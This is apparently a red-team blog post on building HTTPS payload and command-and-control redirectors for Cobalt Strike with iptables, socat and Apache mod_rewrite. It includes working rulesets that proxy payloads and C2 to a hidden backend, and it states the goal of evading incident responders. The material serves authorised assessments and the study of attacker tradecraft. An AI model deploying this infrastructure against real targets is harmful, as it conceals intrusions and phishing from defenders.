---
layout: post
title: HTTPS Payload and C2 Redirectors
tags:
- red team infrastructure
- mod_rewrite
- cobalt strike
image: /assets/ssl-redirectors/ssl-payload-redirection-diagram.png
commentIssueId: 30
---

I've written rather extensively about the use of [redirectors]({{site.baseurl}}/tags#red team infrastructure) and how they can [strengthen your red team assessments]({{site.baseurl}}/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/). Since my first post on the topic, the question I've received most frequently is about how to do the same thing with HTTPS traffic. In this post, I will detail different HTTPS redirection methods and when to use each.

I'd like to give a shoutout to Joe Vest ([@joevest](https://twitter.com/joevest)) for building HTTPS command and control (C2) redirection into his [cs2modrewrite](https://github.com/threatexpress/cs2modrewrite) tool and figuring out some of the required Apache configurations for such redirection.

## Dumb Pipe Redirection

Redirectors can best be described as fitting into one of two categories: dumb pipe or filtering. As its name suggests, the "dumb pipe" redirectors blindly forward traffic from their network interface to another configured host interface. This type of redirector is useful for their quick standup, but natively lack the level of control over the incoming traffic being redirected. As such, dumb pipe redirection will buy you some time by obfuscating your C2 server's true IP address, but it is unlikely to seriously hamper defender investigations.

Since the two methods below do not perform any conditional filtering on traffic, they can be used interchangeably for payload or C2 redirection.

### iptables

Using the Linux firewall tool *iptables*, we can NAT any incoming traffic on a certain port to a remote host IP on a given port. This lets us take any TCP traffic over 443 (line 1 below) and redirect it to our backend server over 443 (line 2 below). Replace `<REMOTE-HOST-IP-ADDRESS>` with the IP address of your backend server and run the following commands with *root* permissions:

```
iptables -I INPUT -p tcp -m tcp --dport 443 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination <REMOTE-HOST-IP-ADDRESS>:443
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD ACCEPT
sysctl net.ipv4.ip_forward=1
```

>Update: Thank you to an eagle-eyed reader who called out that the commands above were incorrectly redirecting to port 80. These have been updated. Thank you, Gabriel!

### socat

*socat* is an alternate tool we can use to create the same kind of traffic redirection. The one-liner below will redirect any traffic from port 443 (the left-most 443 below) to the provided remote host IP address on port 443 (right-most 443). As before, replace `<REMOTE-HOST-IP-ADDRESS>` with the IP address of your backend server.

By default, *socat* runs in the foreground. While you can run the process in the background, I recommend running *socat* within a [screen](https://www.gnu.org/software/screen/manual/screen.html) session to make on-the-fly redirection modifications much easier.

```
socat TCP4-LISTEN:443,fork TCP4:<REMOTE-HOST-IP-ADDRESS>:443
```

*socat* redirectors can begin to experience issues or redirector host slow-downs if you are redirecting large amounts of traffic, such as C2. If you experience those issues, try switching to *iptables*.

## Apache mod_rewrite

While the dumb pipe redirectors are useful for a quick redirector standup, filtering redirectors provide virtually endless methods to hamper defenders from investigating your attack infrastructure. Any mature web server technology should be able to provide filtering redirection, but this blog post focuses on using Apache and its mod_rewrite module.

This section will focus on payload and C2 redirection separately because the redirectors often need to provide differing functionality based on the expected traffic. For the following examples, we will be using `spoofdomain.com` as the attacker domain and using Debian 9 for all servers.

### First-Time Setup

This technique requires a couple one-time setup steps. The steps below include generating and using a LetsEncrypt certificate for the infrastructure. If you acquired your certificate elsewhere or are opting to use a self-signed certificate, skip those steps.

#### Apache and SSL Setup

To set up Apache mod_rewrite for traffic redirection, we will need to perform some first-time setup. For further detail about the initial setup than what is covered below, check out the [mod_rewrite Basics]({{site.baseurl}}/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/#mod_rewrite-basics) section of my first mod_rewrite post.

On your redirector, run the following commands with *root* rights:

```
apt-get install apache2
a2enmod ssl rewrite proxy proxy_http
a2ensite default-ssl.conf
service apache2 restart
```

In the Apache2 configuration file (`/etc/apache2/apache2.conf` by default), locate the *Directory* tag for your site's directory and change **None** to **All**:

```
<Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
```

The commands above will enable multiple Apache modules that we'll be working with and enable SSL on the site, albeit with a self-signed certificate.

#### Generate Cert with LetsEncrypt

If you already have a certificate or wish to use a self-signed certificate, you can skip the steps in this section.

To generate our LetsEncrypt certificate on Debian:

```
sudo service apache2 stop
sudo apt-get install certbot
sudo certbot certonly --standalone -d spoofdomain.com -d www.spoofdomain.com
```

Modify the *certbot* command to include any additional subdomains you want protected with additional `-d` flags. Notice that above we specify the root domain as well as the *www* subdomain.

If there are no generation issues, the cert files will be saved to `/etc/letsencrypt/live/spoofdomain.com`.

Edit the SSL site configuration (located at `/etc/apache2/sites-enabled/default-ssl.conf` by default) so the file paths for the *SSLCertificateFile* and *SSLCertificateKeyFile* options match the LetsEncrypt certificate components' paths:

```
SSLCertificateFile      /etc/letsencrypt/live/spoofdomain.com/cert.pem
SSLCertificateKeyFile   /etc/letsencrypt/live/spoofdomain.com/privkey.pem
```

Also, add the following code to the same file within the VirtualHost tags:

```
# Enable SSL
SSLEngine On
# Enable Proxy
SSLProxyEngine On
# Trust Self-Signed Certificates generated by Cobalt Strike
SSLProxyVerify none
SSLProxyCheckPeerCN off
SSLProxyCheckPeerName off
```

Again, thanks to Joe Vest for figuring the options above out!

We now have a basic SSL installation using a valid LetsEncrypt certificate. From here, the post will demonstrate how to serve payload files or webpages required for your pretexts and how to redirect C2 traffic.

### Payload Redirection

When I'm designing an attack infrastructure, I consider any file or payload that will be publicly hosted for use during social engineering, or any other part of the attack path, to be part of payload redirection. In our setup, the redirector will proxy any valid requests to the corresponding backend server and redirect all other requests to the target's real 404 page. The files can be hosted using either HTTP or HTTPS; the end-user will see a valid SSL connection for *spoofdomain.com*.

Here is what our set up will look like:

{% include image.html file="/assets/ssl-redirectors/ssl-payload-redirection-diagram.png" description="SSL Payload Redirection Diagram" %}

Notice that we are hosting the files over HTTP on the backend. We're doing this for demonstration and ease of setup.

Once our first-time setup is complete on the host (see above) we will add the following text to the file `/var/www/html/.htaccess`:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;font-family: monospace;">
RewriteEngine On<br>
RewriteCond <span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: mediumseagreen">^/(payload\.exe|landingpage\.html)/?$</span> <span style="color: mediumpurple">[NC]</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://REMOTE-HOST-IP<span style="color: dodgerblue">%{REQUEST_URI}</span></span> <span style="color: tomato">[P]</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://example.com/404</span><span style="color: mediumvioletred">?</span> <span style="color: tomato">[L,R=302]</span>
</div>

Here is a color-coded breakdown of what the rules are doing:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;font-family: monospace;">
Enable the rewrite engine<br>
<span style="color: dodgerblue">If the request's URI </span> <span style="color: mediumseagreen">is either '/payload.exe' or '/landingpage.html' (with an optional trailing slash), </span> <span style="color: mediumpurple"> ignoring case; </span><br>
<span style="color: gold">Change the entire request </span> <span style="color: orange">to serve the </span><span style="color: dodgerblue">original request path </span><span style="color: orange">from the remote host's IP, </span> <span style="color: tomato">and keep the user's address bar the same (obscure the backend server's IP).</span><br>
If the above conditions are not met, <span style="color: gold">change the entire request</span> <span style="color: orange"> to http://example.com/404 </span><span style="color: mediumvioletred">and drop any query strings from the original request. </span> <span style="color: tomato">Do not evaluate further rules and redirect the user, changing their address bar.</span>
</div>

Notice in the above ruleset that we are using HTTP for the first RewriteRule, since we are hosting the *payload.exe* and *landingpage.html* file on the backend server using HTTP only.

Here is how the *landingpage.html* file will render in our victims' browsers:

{% include image.html file="/assets/ssl-redirectors/ssl-payload-redirection-demo.png" description="Redirected SSL Traffic to Hosted File" %}

Notice that the browser shows spoofdomain.com in the URL bar, despite the file itself being hosted on another server. The backend file can be hosted either via HTTPS or HTTP; both will appear as expected in the target's browser.

The files can also be hosted on a Cobalt Strike team server. Cobalt Strike versions 3.10 and above support hosting the social engineering attacks and files via SSL. To do this, you need to create a keystore from the SSL certificate, upload the keystore to the Cobalt Strike team server, and specify the keystore in the server's Malleable C2 profile.

Making the keystore for Cobalt Strike:

```
openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out spoofdomain.p12 -name spoofdomain.com -passout pass:mypass
keytool -importkeystore -deststorepass mypass -destkeypass mypass -destkeystore spoofdomain.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass mypass -alias spoofdomain.com
```

Add the keystore info to a [Malleable C2](https://www.cobaltstrike.com/help-malleable-c2) profile:

```
https-certificate {
	set keystore "spoofdomain.store";
	set password "mypass";
}
```

When the team server is started, it will leverage the provided keystore and enable SSL file hosting.

### Command and Control Redirection

Command and Control redirection is largely similar to payload redirection, except that the htaccess file will need to allow only C2, hosted file, and stager URIs.

The C2 URIs are all specified within the team server's Malleable C2 profile on the *set uri* lines. These should be allowed back to the team server using the `%{REQUEST_URI}` mod_rewrite variable.

Hosted files can be served by Cobalt Strike either via HTTP or HTTPS. Hosting the files via HTTPS will require the extra steps of creating the keystore and modifying the Malleable C2 profile; however, it will simplify the redirector's *htaccess* file ruleset. If you opt to host the files via HTTP, ensure your redirector's *htaccess* rules proxy to HTTP, rather than HTTPS.

Stager URIs will need to be redirected back to the team server if you plan to use any staged payloads during your attack path. By default, the Cobalt Strike stager URI is a random four character string. We can allow that through via a regex or, with Cobalt Strike 3.10 and newer, specify a stager URI in a Malleable C2 profile in the *http-stager* block.

Here is a ruleset that redirects that static files of *payload.exe* and *landingpage.html* to the team server over HTTP, while redirecting the C2 URIs of */legit-path-1* and */legit-path-2* and the staging uri of */stager* over HTTPS:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;font-family: monospace;">
RewriteEngine On<br>
RewriteCond <span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: mediumseagreen">^/(payload\.exe|landingpage\.html)/?$</span> <span style="color: mediumpurple">[NC]</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://REMOTE-HOST-IP<span style="color: dodgerblue">%{REQUEST_URI}</span></span> <span style="color: tomato">[P]</span><br>
RewriteCond <span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: mediumseagreen">^/(legit-path-1|legit-path-2|stager)/?$</span> <span style="color: mediumpurple">[NC]</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">https://REMOTE-HOST-IP<span style="color: dodgerblue">%{REQUEST_URI}</span></span> <span style="color: tomato">[P]</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://example.com/404</span><span style="color: mediumvioletred">?</span> <span style="color: tomato">[L,R=302]</span>
</div>

Here is a color-coded breakdown of what the rules are doing:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;font-family: monospace;">
Enable the rewrite engine<br>
<span style="color: dodgerblue">If the request's URI </span> <span style="color: mediumseagreen">is either '/payload.exe' or '/landingpage.html' (with an optional trailing slash), </span> <span style="color: mediumpurple"> ignoring case; </span><br>
<span style="color: gold">Change the entire request </span> <span style="color: orange">to serve the </span><span style="color: dodgerblue">original request path </span><span style="color: orange"> over HTTP from the remote host's IP, </span> <span style="color: tomato">and keep the user's address bar the same (obscure the backend server's IP).</span><br>
<span style="color: dodgerblue">If the request's URI </span> <span style="color: mediumseagreen">is '/legit-path-1', '/legit-path-2', or '/stager' (with an optional trailing slash), </span> <span style="color: mediumpurple"> ignoring case; </span><br>
<span style="color: gold">Change the entire request </span> <span style="color: orange">to serve the </span><span style="color: dodgerblue">original request path </span><span style="color: orange"> over HTTPS from the remote host's IP, </span> <span style="color: tomato">and keep the user's address bar the same (obscure the backend server's IP).</span><br>
If the above conditions are not met, <span style="color: gold">change the entire request</span> <span style="color: orange"> to http://example.com/404 </span><span style="color: mediumvioletred">and drop any query strings from the original request. </span> <span style="color: tomato">Do not evaluate further rules and redirect the user, changing their address bar.</span>
</div>

This is obviously a contrived example and you'll want to set this up with a Malleable C2 profile that provides some evasion benefits, but the code above should illustrate how to mix content between HTTP and HTTPS.

For more information about Cobalt Strike C2 redirection, with some examples, check out my post [Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite]({{site.baseurl}}/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/).

#### Many Redirectors to One Backend Server

SSL redirectors provide the interesting capability of protecting multiple callback domains with distinct SSL certificates. Since the certificates can be completely unique, this setup can reduce the risks of incident responders identifying C2 domains based on certificate metadata.

Here is what that setup would look like:

{% include image.html file="/assets/ssl-redirectors/multiple-ssl-domains-diagram.png" description="Using Multiple Domains with SSL Redirection" %}

We set up each redirector as its own segment, following the steps detailed in the sections above. The key difference in setup is specifying the two domains in our callback popup during the Cobalt Strike listener setup. Here is what that setup looks like in Cobalt Strike:

{% include image.html file="/assets/ssl-redirectors/multiple-ssl-domains-cobalt-setup.png" description="Setting Up an HTTPS Listener to Use Multiple SSL Domains with Unique Certificates" %}

Notice we specify *phishdomain.com* as the primary listener's Host entry (for staging) and the two domains (*phishdomain.com* and *spoofdomain.com*) in the Beacons field. We also set up a foreign listener pointing to the other domain to allow us to stage over *spoofdomain.com* if needed. With this setup, Beacons will stage over the chosen listener's Host field and subsequently check-in round robin over the domains specified in the Beacons field.

## Forcing HTTPS

In some setups, you may want to force all traffic over HTTPS, rather than allowing mixed content. In that case, add the following lines after the *RewriteEngine On* line of your *htaccess* ruleset:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;font-family: monospace;">
RewriteCond <span style="color: mediumvioletred">%{HTTPS}</span> <span style="color: mediumseagreen">!=on</span> <span style="color: mediumpurple">[NC]</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">https://REDIRECTOR-DOMAIN.com<span style="color: dodgerblue">%{REQUEST_URI}</span></span> <span style="color: tomato">[L,R=301]</span><br>
</div>

Here is a color-coded breakdown of what the rules are doing:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;font-family: monospace;">
Enable the rewrite engine<br>
<span style="color: mediumvioletred">If the request's SSL status </span> <span style="color: mediumseagreen">is NOT "on"</span>,<br>
<span style="color: gold">Change the entire request </span> <span style="color: orange">to serve the </span><span style="color: dodgerblue">original request path </span><span style="color: orange">from REDIRECTOR-DOMAIN.com over HTTPS, </span> <span style="color: tomato">and change the user's address bar show the redirection. Make the redirect permanent with a 301 code.</span><br>
</div>

The above ruleset was taken and slightly modified from AskApache.com from [here](https://www.askapache.com/htaccess/mod_rewrite-variables-cheatsheet/#HTTPS). The `%{HTTPS}` variable will return "on" if the request is using SSL/TLS, and will return "off" if the request is using HTTP only.

## Summary
Redirectors are a critical component in covert attack infrastructure. They are used to obfuscate backend infrastructure and can be used to confuse or disorient incident responders who are investigating your setup. Redirector traffic should blend into the expected traffic on a network. Since SSL/TLS adoption is rapidly rising, you will likely run into instances when your redirectors will need to run SSL/TLS with valid certificates. This post detailed how to set that up and some powerful things you can do with SSL-enabled redirectors, such as using multiple domains with an HTTPS Cobalt Strike listener.

*Update: [e0x70i](https://github.com/e0x70i) pointed out in the comments of my [Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite]({{site.baseurl}}/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/) post, if your Cobalt Strike Malleable C2 profile contains an Accept-Encoding header for gzip, your Apache install may compress that traffic by default and cause your Beacon to be unresponsive or function incorrectly. To overcome this, disable mod_deflate (via `a2dismod deflate` and add the No Encode (`[NE]`) flag to your rewrite rules. (Thank you, e0x70i!)*

# Resources
* [Automating Apache mod_rewrite and Cobalt Strike Malleable C2 for Intelligent Redirection](http://threatexpress.com/2018/02/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/) - [Joe Vest (@joevest)](https://twitter.com/joevest)
* [mod-rewrite-cheatsheet.com](http://mod-rewrite-cheatsheet.com)
* [Official Apache 2.4 mod_rewrite Documentation](http://httpd.apache.org/docs/current/rewrite/)
* [Apache mod_rewrite Introduction](https://httpd.apache.org/docs/2.4/en/rewrite/intro.html)
* [An In-Depth Guide to mod_rewrite for Apache](http://code.tutsplus.com/tutorials/an-in-depth-guide-to-mod_rewrite-for-apache--net-6708)